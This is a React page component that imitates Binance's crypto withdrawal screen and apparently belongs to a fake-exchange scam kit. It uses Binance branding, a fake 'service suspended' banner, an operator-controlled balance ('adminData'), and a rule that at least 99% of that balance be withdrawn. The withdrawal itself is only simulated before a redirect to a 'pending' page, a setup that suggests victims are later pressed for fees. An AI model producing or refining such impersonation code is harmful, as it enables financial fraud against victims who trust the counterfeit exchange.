import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/contexts/AppContext';
import { detectNetworkFromAddress, generateTransactionId } from '@/utils/validation';
import { LoadingBars } from '@/components/LoadingBars';
import { LoadingOverlay } from '@/pages/LoadingScreen';
import { MenuModal } from '@/components/modals/MenuModal';
import { ProfileModal } from '@/components/modals/ProfileModal';
import { WithdrawalModal } from '@/components/modals/WithdrawalModal';
import { ChevronDown, Globe, Moon, ArrowUp, ArrowDown, User, Menu, BookOpen, X, Info, Search } from 'lucide-react';

interface Coin {
  id: string;
  name: string;
  icon: string;
}

interface Network {
  id: string;
  name: string;
  fee: string;
  time: string;
}

const coins: Coin[] = [
  { id: 'BTC', name: 'Bitcoin', icon: '/source/coins/btc.png' },
  { id: 'ETH', name: 'Ethereum', icon: '/source/coins/eth.png' },
  { id: 'USDT', name: 'TetherUS', icon: '/source/coins/usdt.png' },
  { id: 'BNB', name: 'BNB', icon: '/source/coins/bnb.png' },
  { id: 'SOL', name: 'Solana', icon: '/source/coins/sol.png' },
  { id: 'XRP', name: 'XRP', icon: '/source/coins/xrp.png' },
  { id: 'USDC', name: 'USD Coin', icon: '/source/coins/usdc.png' },
  { id: 'ADA', name: 'Cardano', icon: '/source/coins/ada.png' },
  { id: 'DOGE', name: 'Dogecoin', icon: '/source/coins/doge.png' },
  { id: 'TRX', name: 'TRON', icon: '/source/coins/trx.png' },
];

const networks: Network[] = [
  { id: 'BTC', name: 'Bitcoin', fee: '0.000015', time: '≈ 30 mins' },
  { id: 'BSC', name: 'BNB Smart Chain (BEP20)', fee: '0.0001', time: '≈ 3 mins' },
  { id: 'ETH', name: 'Ethereum (ERC20)', fee: '0.001', time: '≈ 5 mins' },
  { id: 'TRC20', name: 'Tron (TRC20)', fee: '0.001', time: '≈ 1 min' },
  { id: 'SOL', name: 'Solana', fee: '0.000005', time: '≈ 1 min' },
  { id: 'ARB', name: 'Arbitrum One', fee: '0.0001', time: '≈ 2 mins' },
];

export function Withdrawal() {
  const navigate = useNavigate();
  const { adminData, showToast, addWithdrawal, setIsLoading, setPendingWithdrawal, isLoading } = useApp();

  // State
  const [selectedCoin, setSelectedCoin] = useState<Coin>(coins[0]);
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');

  // Modal states
  const [showCoinModal, setShowCoinModal] = useState(false);
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [showMenuModal, setShowMenuModal] = useState(false);
  const [showProfileModal, setShowProfileModal] = useState(false);

  // UI states
  const [showFeeInfo, setShowFeeInfo] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showMinWithdrawalError, setShowMinWithdrawalError] = useState(false);
  const [showTestWarning, setShowTestWarning] = useState(false);
  const [coinSearch, setCoinSearch] = useState('');

  const addressRef = useRef<HTMLTextAreaElement>(null);

  // Auto-detect network from address
  useEffect(() => {
    if (address && !selectedNetwork) {
      const detected = detectNetworkFromAddress(address);
      if (detected) {
        const network = networks.find(n => n.id === detected || (detected === 'BSC' && n.id === 'BSC'));
        if (network) {
          setSelectedNetwork(network);
        }
      }
    }
  }, [address, selectedNetwork]);

  // Update UI when amount changes
  useEffect(() => {
    const numAmount = parseFloat(amount) || 0;
    const minWithdrawalAmount = adminData.cryptoBalance * 0.99;
    setShowFeeInfo(numAmount > 0);
    setShowError(numAmount > adminData.cryptoBalance);
    setShowMinWithdrawalError(numAmount > 0 && numAmount < minWithdrawalAmount && numAmount > 0);
    setShowTestWarning(numAmount > 0);
  }, [amount, adminData.cryptoBalance]);

  const handleAddressInput = (value: string) => {
    setAddress(value);
    // Auto-resize textarea
    if (addressRef.current) {
      addressRef.current.style.height = 'auto';
      addressRef.current.style.height = Math.max(52, addressRef.current.scrollHeight) + 'px';
    }
  };

  const handleAmountInput = (value: string) => {
    setAmount(value);
  };

  const setMaxAmount = () => {
    setAmount(adminData.cryptoBalance.toFixed(6));
  };

  const calculateReceiveAmount = () => {
    const numAmount = parseFloat(amount) || 0;
    const fee = numAmount * 0.002;
    return Math.max(0, numAmount - fee);
  };

  const calculateNetworkFee = () => {
    const numAmount = parseFloat(amount) || 0;
    return (numAmount * 0.002).toFixed(6);
  };

  const isFormValid = () => {
    const numAmount = parseFloat(amount) || 0;
    return address.length > 10 && numAmount > 0 && numAmount <= adminData.cryptoBalance && selectedNetwork;
  };

  const handleWithdraw = async () => {
    if (!isFormValid()) return;

    setIsLoading(true);

    // Simulate processing (2.5s)
    await new Promise(resolve => setTimeout(resolve, 2500));

    setIsLoading(false);
    setShowWithdrawModal(true);
  };

  const handleConfirmWithdrawal = async () => {
  const numAmount = parseFloat(amount) || 0;
  
  // Create transaction
  const transaction = {
  id: generateTransactionId(),
  amount: numAmount,
  cryptoSymbol: selectedCoin.id,
  address: address,
  network: selectedNetwork?.id || '',
  timestamp: Date.now(),
  status: 'pending' as const,
  };
  
  addWithdrawal(transaction);
  setShowWithdrawModal(false);
  
  // Store pending withdrawal in context
  setPendingWithdrawal({ amount: numAmount, symbol: selectedCoin.id });
  
  setIsLoading(true);
  
  // Simulate processing (2.5s) before showing pending page
  await new Promise(resolve => setTimeout(resolve, 2500));
  navigate('/pending');
  };

  const filteredCoins = coins.filter(c =>
    c.id.toLowerCase().includes(coinSearch.toLowerCase()) ||
    c.name.toLowerCase().includes(coinSearch.toLowerCase())
  );

  // Step indicators
  const isStep1Complete = true; // Coin always selected
  const isStep2Complete = address.length > 10;
  const isStep3Complete = parseFloat(amount) > 0;

  return (
    <div className="min-h-screen bg-[#1D252B] text-white">
      <style>{`
        @keyframes loading-bar {
          0%, 100% { transform: scaleY(1); }
          50% { transform: scaleY(0.4); }
        }
        @keyframes pulse-timer {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        .timer-pulse {
          animation: pulse-timer 1s ease-in-out infinite;
        }
        .custom-scrollbar::-webkit-scrollbar {
          width: 3px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background-color: #474d57;
          border-radius: 20px;
        }
        .diamond {
          transform: rotate(45deg);
          border-radius: 4px;
        }
        .diamond-content {
          transform: rotate(-45deg);
        }
      `}</style>

      {/* Header */}
      <header className="flex items-center justify-between px-3 sm:px-4 py-2 sm:py-3 bg-[#1D252B]">
        <div className="flex items-center gap-2 sm:gap-3">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>
        <div className="flex items-center gap-2 sm:gap-3">
          <button
            onClick={() => showToast('Deposit feature restricted', 'info')}
            className="bg-[#f0b90b] text-[#1D252B] rounded-md font-semibold flex items-center gap-1 transition-all hover:bg-[#f8d12f] hover:-translate-y-px px-2 sm:px-4 py-1.5 sm:py-2 text-xs sm:text-sm"
          >
            <ArrowDown className="w-3 h-3 sm:w-4 sm:h-4" />
            <span>Deposit</span>
          </button>
          <button
            onClick={() => setShowProfileModal(true)}
            className="w-7 h-7 sm:w-8 sm:h-8 border border-[#474d57] rounded-full flex items-center justify-center text-white transition-all hover:border-[#f0b90b] hover:text-[#f0b90b]"
          >
            <User className="w-3 h-3 sm:w-4 sm:h-4" />
          </button>
          <button
            onClick={() => setShowMenuModal(true)}
            className="text-white p-1"
          >
            <Menu className="w-5 h-5 sm:w-6 sm:h-6" />
          </button>
        </div>
      </header>

      {/* Service Suspension Banner */}
      <div className="w-full bg-[#1D252B] px-4 py-3 flex items-start gap-3 relative animate-in fade-in slide-in-from-top-2 duration-500">
        <svg className="w-4 h-4 text-white flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/>
        </svg>
        <div className="flex-1 text-xs leading-relaxed text-gray-200 font-semibold pr-8">
          Service suspended: according to our <span className="font-bold text-white">Terms of Use</span>, we are unable to provide services to users while they are in a restricted country (including restricted IP addresses). Your account and funds are safe. You can only <button onClick={() => navigate('/withdrawal')} className="text-[#F0B90B] underline hover:no-underline font-bold">withdraw your funds</button>; depositing and other product trading services are suspended. For further support, please contact <button onClick={() => showToast('Customer Service unavailable', 'info')} className="text-[#F0B90B] underline hover:no-underline font-bold">Customer Service</button>.
        </div>
        <button
          onClick={(e) => {
            const banner = e.currentTarget.closest('.w-full');
            banner?.remove();
          }}
          className="absolute top-1/2 -translate-y-1/2 right-3 text-gray-400 hover:text-white transition-colors"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/>
          </svg>
        </button>
      </div>

      {/* Sub Header */}
      <div className="px-3 sm:px-4 py-2 sm:py-3 flex items-center justify-between border-b border-[#474d57]/30 bg-[#1D252B]">
        <div className="flex items-center gap-2 sm:gap-3">
          <ArrowUp className="w-4 h-4 sm:w-5 sm:h-5" />
          <span className="font-semibold text-base sm:text-lg">Withdraw Crypto</span>
        </div>
        <ChevronDown className="text-[#848e9c] w-4 h-4 sm:w-5 sm:h-5" />
      </div>

      {/* Main Content */}
      <main className="px-3 sm:px-4 py-4 pb-8 max-w-lg mx-auto bg-[#1D252B]">
        {/* Step 1 - Select Coin */}
        <div className="flex gap-2 sm:gap-3 mb-4 sm:mb-6">
          <div className="flex flex-col items-center">
            <div className={`w-4 h-4 sm:w-5 sm:h-5 border diamond flex items-center justify-center transition-all ${isStep1Complete ? 'bg-white border-white' : 'border-white/30'}`}>
              <span className={`text-[8px] sm:text-[10px] font-bold diamond-content ${isStep1Complete ? 'text-[#1D252B]' : 'text-white/50'}`}>
                {isStep1Complete ? '✓' : '1'}
              </span>
            </div>
          </div>
          <div className="flex-1">
            <h3 className={`font-bold text-sm sm:text-base mb-2 transition-all ${isStep1Complete ? 'text-white' : 'text-white/40'}`}>Select coin</h3>
            <button
              onClick={() => setShowCoinModal(true)}
              className="w-full bg-[#2b3139] rounded-lg p-3 sm:p-4 flex items-center justify-between"
            >
              <div className="flex items-center gap-2">
                <img src={selectedCoin.icon} className="w-6 h-6 sm:w-7 sm:h-7 rounded-full" alt={selectedCoin.id} />
                <div className="flex items-center gap-1.5">
                  <span className="font-bold text-sm sm:text-base">{selectedCoin.id}</span>
                  <span className="text-[#848e9c] text-xs sm:text-sm">{selectedCoin.name}</span>
                </div>
              </div>
              <ChevronDown className="text-[#848e9c] w-3 h-3 sm:w-4 sm:h-4" />
            </button>
          </div>
        </div>

        {/* Step 2 - Withdraw To */}
        <div className="flex gap-2 sm:gap-3 mb-4 sm:mb-6">
          <div className="flex flex-col items-center">
            <div className={`w-4 h-4 sm:w-5 sm:h-5 border diamond flex items-center justify-center transition-all ${isStep2Complete ? 'bg-white border-white' : 'border-white/30'}`}>
              <span className={`text-[8px] sm:text-[10px] font-bold diamond-content ${isStep2Complete ? 'text-[#1D252B]' : 'text-white/50'}`}>
                {isStep2Complete ? '✓' : '2'}
              </span>
            </div>
          </div>
          <div className="flex-1">
            <h3 className={`font-bold text-sm sm:text-base mb-2 transition-all ${isStep2Complete ? 'text-white' : 'text-white/40'}`}>Withdraw to</h3>

            <div className="flex gap-3 sm:gap-4 mb-2 sm:mb-3 border-b border-[#474d57]/30">
              <button className="pb-2 text-sm sm:text-base font-bold text-white border-b-2 border-[#f0b90b] relative -mb-[1px]">Address</button>
              <button
                onClick={() => showToast('Binance user transfer unavailable', 'info')}
                className="pb-2 text-sm sm:text-base font-bold text-[#848e9c]"
              >
                Binance user
              </button>
            </div>

            <div className="relative mb-2 sm:mb-3">
              <textarea
                ref={addressRef}
                value={address}
                onChange={(e) => handleAddressInput(e.target.value)}
                placeholder="Enter Address"
                rows={1}
                className="w-full bg-[#2b3139] rounded-lg p-3 sm:p-4 pr-10 text-xs sm:text-sm font-mono resize-none focus:outline-none focus:ring-2 focus:ring-[#f0b90b]/50 text-white placeholder-[#848e9c] min-h-[52px] sm:min-h-[60px] overflow-hidden"
              />
              <button
                onClick={() => showToast('Address book', 'info')}
                className="absolute right-2 sm:right-3 top-3 sm:top-4 text-[#848e9c]"
              >
                <BookOpen className="w-4 h-4 sm:w-5 sm:h-5" />
              </button>
            </div>

            <button
              onClick={() => setShowNetworkModal(true)}
              className="w-full bg-[#2b3139] rounded-lg p-3 sm:p-4 flex items-center justify-between mb-2 sm:mb-3"
            >
              <div className="flex items-center gap-2">
                {selectedNetwork ? (
                  <>
                    <span className="font-bold text-xs sm:text-sm">{selectedNetwork.id}</span>
                    <span className="text-[#848e9c] text-xs sm:text-sm ml-1">{selectedNetwork.name}</span>
                    <span className="ml-2 px-1.5 py-0.5 bg-[#0ecb81]/20 text-[#0ecb81] text-xs rounded font-medium">Auto Matched</span>
                  </>
                ) : (
                  <span className="text-[#848e9c] text-xs sm:text-sm">Select network</span>
                )}
              </div>
              <ChevronDown className="text-[#848e9c] w-3 h-3 sm:w-4 sm:h-4" />
            </button>

            {selectedNetwork && (
              <div className="text-xs sm:text-sm text-[#848e9c] leading-relaxed">
                Please note that withdrawal fees have been adjusted in due of the recent increase in activities on the {selectedCoin.id} network.
              </div>
            )}
          </div>
        </div>

        {/* Step 3 - Withdraw Amount */}
        <div className="flex gap-2 sm:gap-3">
          <div className="flex flex-col items-center">
            <div className={`w-4 h-4 sm:w-5 sm:h-5 border diamond flex items-center justify-center transition-all ${isStep3Complete ? 'bg-white border-white' : 'border-white/30'}`}>
              <span className={`text-[8px] sm:text-[10px] font-bold diamond-content ${isStep3Complete ? 'text-[#1D252B]' : 'text-white/50'}`}>
                {isStep3Complete ? '✓' : '3'}
              </span>
            </div>
          </div>
          <div className="flex-1">
            <h3 className={`font-bold text-sm sm:text-base mb-2 transition-all ${isStep3Complete ? 'text-white' : 'text-white/40'}`}>Withdraw amount</h3>

            <div className="relative mb-2 sm:mb-3">
              <input
                type="number"
                value={amount}
                onChange={(e) => handleAmountInput(e.target.value)}
                placeholder="Minimal 0.00012"
                className={`w-full bg-[#2b3139] rounded-lg p-3 sm:p-4 pr-20 sm:pr-24 text-sm sm:text-base font-medium focus:outline-none focus:ring-2 text-white placeholder-[#848e9c] ${showError ? 'ring-2 ring-[#f6465d]' : 'focus:ring-[#f0b90b]/50'}`}
              />
              <div className="absolute right-2 sm:right-3 top-1/2 -translate-y-1/2 flex items-center gap-1 sm:gap-2">
                <span className="font-bold text-xs sm:text-sm">{selectedCoin.id}</span>
                <button
                  onClick={setMaxAmount}
                  className="text-[#f0b90b] font-bold text-xs sm:text-sm"
                >
                  MAX
                </button>
              </div>
            </div>

            {/* Minimum Withdrawal Error Message */}
            {showMinWithdrawalError && (
              <div className="mb-2 sm:mb-3 bg-[#2b1a1a] border border-[#f6465d]/30 rounded-lg p-3 sm:p-4">
                <div className="flex gap-2">
                  <div className="w-4 h-4 sm:w-5 sm:h-5 rounded-full border border-[#f6465d] flex items-center justify-center flex-shrink-0 mt-0.5">
                    <Info className="w-3 h-3 sm:w-4 sm:h-4 text-[#f6465d]" />
                  </div>
                  <div>
                    <p className="text-xs sm:text-sm text-[#f6465d] leading-relaxed font-medium">
                      Please ensure to withdraw all available funds in your account to avoid any future losses due to service discontinuation in your region.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Fee Info */}
            {showFeeInfo && (
              <div className="mb-2 sm:mb-3 bg-[#2b2a1a] rounded-lg p-3 sm:p-4 relative">
                <button
                  onClick={() => setShowFeeInfo(false)}
                  className="absolute right-2 top-2 text-[#848e9c] hover:text-white"
                >
                  <X className="w-3 h-3 sm:w-4 sm:h-4" />
                </button>
                <div className="flex gap-2">
                  <div className="w-4 h-4 sm:w-5 sm:h-5 rounded-full border border-[#f0b90b] flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-[#f0b90b] text-xs">i</span>
                  </div>
                  <div>
                    <p className="text-xs sm:text-sm text-[#848e9c] leading-relaxed">
                      {selectedCoin.id} fees may increase during network congestion. Binance gains no benefit. Tap the gas icon below to view estimated transaction costs.
                    </p>
                    <button
                      onClick={() => showToast('Learn more (email support)', 'info')}
                      className="text-[#0ecb81] text-xs sm:text-sm mt-1 font-medium"
                    >
                      Learn more (email support)
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Error Message */}
            {showError && (
              <div className="text-[#f6465d] text-xs sm:text-sm mb-2">
                Please enter an amount no higher than your available balance.
              </div>
            )}

            {/* Test Warning */}
            {showTestWarning && (
              <div className="text-xs sm:text-sm text-[#848e9c] mb-2 sm:mb-3 leading-relaxed">
                This address hasn't been used recently. To avoid errors, we recommend making a <span className="text-[#f0b90b]">test withdrawal</span> with the minimum amount first.
              </div>
            )}

            {/* Balance Info */}
            <div className="space-y-1.5 sm:space-y-2 mb-2 sm:mb-3">
              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-[#848e9c]">Available Withdraw</span>
                <span className="font-medium">{adminData.cryptoBalance.toFixed(4)} {selectedCoin.id}</span>
              </div>
              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-[#848e9c]">24h remaining limit</span>
                <div className="text-right">
                  <span>0.030281 {selectedCoin.id} / </span>
                  <span className="text-[#f6465d]">0.030281 {selectedCoin.id}</span>
                  <Info className="inline w-3 h-3 ml-1 text-[#848e9c]" />
                </div>
              </div>
            </div>

            {/* Receive Amount */}
            <div className="mb-3 sm:mb-4">
              <div className="flex items-center gap-1 mb-1 text-[#848e9c] text-xs sm:text-sm">
                <span>Receive amount</span>
                <ArrowUp className="w-3 h-3 rotate-90" />
              </div>
              <div className="text-xl sm:text-2xl font-bold mb-1">
                {calculateReceiveAmount().toFixed(6)} {selectedCoin.id}
              </div>
              <div className="text-[#848e9c] text-xs sm:text-sm flex items-center gap-1 flex-wrap">
                Network Fee <span>{calculateNetworkFee()}</span> {selectedCoin.id}
                <ChevronDown className="w-3 h-3 rotate-[-90deg]" />
              </div>
            </div>

            {/* Withdraw Button */}
            <button
              onClick={handleWithdraw}
              disabled={!isFormValid() || isLoading}
              className={`w-full font-bold py-3 sm:py-4 rounded-lg text-sm sm:text-base transition-all flex items-center justify-center ${
                isFormValid()
                  ? 'bg-[#f0b90b] text-[#1D252B] hover:bg-[#d4a009]'
                  : 'bg-[#f0b90b]/30 text-white/50 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <LoadingBars color="bg-[#1E2329]" />
              ) : (
                'Withdraw'
              )}
            </button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1D252B] px-3 sm:px-4 py-4 sm:py-6 border-t border-[#474d57]/30">
        <div className="flex items-center justify-between mb-4 sm:mb-6 flex-wrap gap-2">
          <div className="flex items-center gap-4 sm:gap-6">
            <button
              onClick={() => showToast('Language settings unavailable', 'info')}
              className="flex items-center gap-1.5 sm:gap-2 cursor-pointer hover:text-white transition-colors"
            >
              <Globe className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
              <span className="text-white font-medium text-sm sm:text-base">English</span>
            </button>

            <button
              onClick={() => showToast('Currency settings unavailable', 'info')}
              className="flex items-center gap-1.5 sm:gap-2 cursor-pointer hover:text-white transition-colors"
            >
              <div className="w-4 h-4 sm:w-5 sm:h-5 rounded-full border border-white flex items-center justify-center">
                <span className="text-white text-xs font-bold">$</span>
              </div>
              <span className="text-white font-medium text-sm sm:text-base">USD</span>
            </button>
          </div>

          <div className="flex items-center gap-1.5 sm:gap-2">
            <span className="text-white font-medium text-sm sm:text-base">Theme</span>
            <button
              onClick={() => showToast('Theme settings unavailable', 'info')}
              className="w-10 h-5 sm:w-12 sm:h-6 bg-[#2b3139] rounded-full relative flex items-center px-1 transition-colors hover:bg-[#313945]"
            >
              <div className="w-3.5 h-3.5 sm:w-4 sm:h-4 bg-white rounded-full absolute right-1 flex items-center justify-center">
                <Moon className="w-3 h-3 text-[#1D252B] text-xs" />
              </div>
            </button>
          </div>
        </div>

        <div className="border-t border-[#474d57]/30 mb-3 sm:mb-4"></div>

        <div className="mb-3 sm:mb-4">
          <p className="text-[#848e9c] text-xs sm:text-sm leading-relaxed">
            Binance ADGM entities are regulated by the Financial Services Regulatory Authority (FSRA) of the Abu Dhabi Global Markets (ADGM) as follows: (1) Nest Exchange Limited is recognised as a Recognised Investment Exchange (Derivatives), with a stipulation to Operate a Multi-Lateral Trading Facility; (2) Nest Clearing and Custody Limited is recognised as a, with a stipulation to Provide Custody and operating a Central Securities Depository; (3) Nest Trading Limited is authorised to carry out the following Regulated Activities: (i) Dealing in Investments as Principal; (ii) Dealing in Investments as Agent; (iii) Arranging Deals in Investments; (iv) Managing Assets; (v) Providing Money Services; and (vi) Arranging Custody.
          </p>
        </div>

        <div className="mb-4 sm:mb-6">
          <p className="text-[#848e9c] text-xs sm:text-sm leading-relaxed">
            <span className="font-medium">Risk Warning:</span> Virtual asset prices can be volatile. The value of your investment may go down or up and you may not get back the amount invested. You are solely responsible for your investment decisions and Binance is not liable for any trading losses you may incur.
          </p>
        </div>

        <div className="space-y-1">
          <p className="text-[#848e9c] text-xs sm:text-sm">Binance© 2026</p>
          <button
            onClick={() => showToast('Cookie preferences coming soon', 'info')}
            className="text-[#848e9c] text-xs sm:text-sm cursor-pointer hover:text-white transition-colors"
          >
            Cookie Preferences
          </button>
        </div>
      </footer>

      {/* Coin Selection Modal */}
      {showCoinModal && (
        <div className="fixed inset-0 z-50">
          <div className="absolute inset-0 bg-black/80" onClick={() => setShowCoinModal(false)} />
          <div className="absolute bottom-0 left-0 right-0 bg-[#1D252B] rounded-t-2xl max-h-[80vh] overflow-hidden">
            <div className="p-2.5 sm:p-3 border-b border-[#474d57] flex items-center justify-between">
              <h2 className="font-bold text-sm sm:text-base">Select coin</h2>
              <button onClick={() => setShowCoinModal(false)}>
                <X className="w-5 h-5 sm:w-6 sm:h-6" />
              </button>
            </div>
            <div className="p-2.5 sm:p-3">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-[#848e9c] w-4 h-4 sm:w-5 sm:h-5" />
                <input
                  type="text"
                  value={coinSearch}
                  onChange={(e) => setCoinSearch(e.target.value)}
                  placeholder="Search Coin"
                  className="w-full bg-[#2b3139] rounded-lg pl-9 pr-3 py-2 text-sm sm:text-base text-white focus:outline-none focus:ring-2 focus:ring-[#f0b90b]/50"
                />
              </div>
            </div>
            <div className="overflow-y-auto max-h-[50vh] p-2">
              {filteredCoins.map((coin) => (
                <button
                  key={coin.id}
                  onClick={() => {
                    setSelectedCoin(coin);
                    setShowCoinModal(false);
                  }}
                  className="w-full flex items-center gap-3 p-2.5 sm:p-3 hover:bg-white/5 rounded-lg cursor-pointer"
                >
                  <img src={coin.icon} className="w-8 h-8 sm:w-9 sm:h-9 rounded-full" alt={coin.id} />
                  <div className="text-left">
                    <div className="font-bold text-sm sm:text-base">{coin.id}</div>
                    <div className="text-[#848e9c] text-xs sm:text-sm">{coin.name}</div>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Network Selection Modal */}
      {showNetworkModal && (
        <div className="fixed inset-0 z-50">
          <div className="absolute inset-0 bg-black/80" onClick={() => setShowNetworkModal(false)} />
          <div className="absolute bottom-0 left-0 right-0 bg-[#1D252B] rounded-t-2xl max-h-[80vh] overflow-hidden">
            <div className="p-2.5 sm:p-3 border-b border-[#474d57] flex items-center justify-between">
              <h2 className="font-bold text-sm sm:text-base">Select withdrawal network</h2>
              <button onClick={() => setShowNetworkModal(false)}>
                <X className="w-5 h-5 sm:w-6 sm:h-6" />
              </button>
            </div>
            <div className="p-2.5 sm:p-3 bg-[#2b3139] mx-2.5 sm:mx-3 mt-2.5 sm:mt-3 rounded-lg flex gap-2">
              <div className="w-4 h-4 sm:w-5 sm:h-5 rounded-full border border-[#848e9c] flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-xs">i</span>
              </div>
              <p className="text-xs sm:text-sm text-[#848e9c]">Please ensure your receiving platform supports the token and network you are withdrawing.</p>
            </div>
            <div className="overflow-y-auto max-h-[50vh] p-2">
              {networks.map((network) => (
                <button
                  key={network.id}
                  onClick={() => {
                    setSelectedNetwork(network);
                    setShowNetworkModal(false);
                  }}
                  className="w-full flex items-center justify-between p-2.5 sm:p-3 hover:bg-white/5 rounded-lg cursor-pointer"
                >
                  <div className="text-left">
                    <div className="font-bold text-sm sm:text-base">{network.id}</div>
                    <div className="text-[#848e9c] text-xs sm:text-sm">{network.name}</div>
                  </div>
                  <div className="text-right text-xs sm:text-sm text-[#848e9c]">
                    <div>Arrival time {network.time}</div>
                    <div>fee {network.fee} {selectedCoin.id}</div>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Withdrawal Modal */}
      <WithdrawalModal
        isOpen={showWithdrawModal}
        onClose={() => setShowWithdrawModal(false)}
        amount={parseFloat(amount) || 0}
        coin={selectedCoin.id}
        onConfirm={handleConfirmWithdrawal}
      />

      {/* Menu Modal */}
      <MenuModal isOpen={showMenuModal} onClose={() => setShowMenuModal(false)} />

      {/* Profile Modal */}
      <ProfileModal isOpen={showProfileModal} onClose={() => setShowProfileModal(false)} />

      {/* Loading Overlay */}
      <LoadingOverlay show={isLoading} redirectTo="/pending" duration={2500} />
    </div>
  );
}

export default Withdrawal;
